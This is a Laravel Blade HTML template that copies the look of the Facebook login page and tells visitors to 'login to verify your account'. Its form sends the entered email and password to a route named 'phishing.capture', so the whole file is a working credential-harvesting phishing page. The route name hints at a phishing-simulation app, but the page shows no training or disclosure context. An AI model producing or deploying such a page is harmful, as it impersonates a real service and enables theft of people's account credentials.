<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Facebook Login</title>
    <style>
        body
        {
            font-family: Arial, Helvetica, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
        }

        .navbar
        {
            background: white;
            border-bottom: 1px solid #ddd;
            padding: 10px 20px;
        }

        .navbar .logo
        {
            color: #1877f2;
            font-size: 28px;
            font-weight: bold;
            text-decoration: none;
        }

        .container
        {
            width: 400px;
            margin: 100px auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
        }

        h2
        {
            margin-bottom: 15px;
        }

        input
        {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button.main
        {
            width: 100%;
            background: #1877f2;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }

        button.main:hover
        {
            background: #166fe5;
        }

        .note
        {
            margin-top: 8px;
            font-size: 14px;
            color: #606770;
        }

    </style>
</head>
<body>
    <div class="navbar">
        <a href="#" class="logo">facebook</a>
    </div>
    <div class="container">
        <h2>Login</h2>
        <p class="note">Please login to verify your account</p>
        <form action="{{route('phishing.capture')}}" method="POST">
            @csrf
            <input type="text" name="email" placeholder="Email address or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="main">Log in</button>
        </form>
    </div>
</body>
</html>
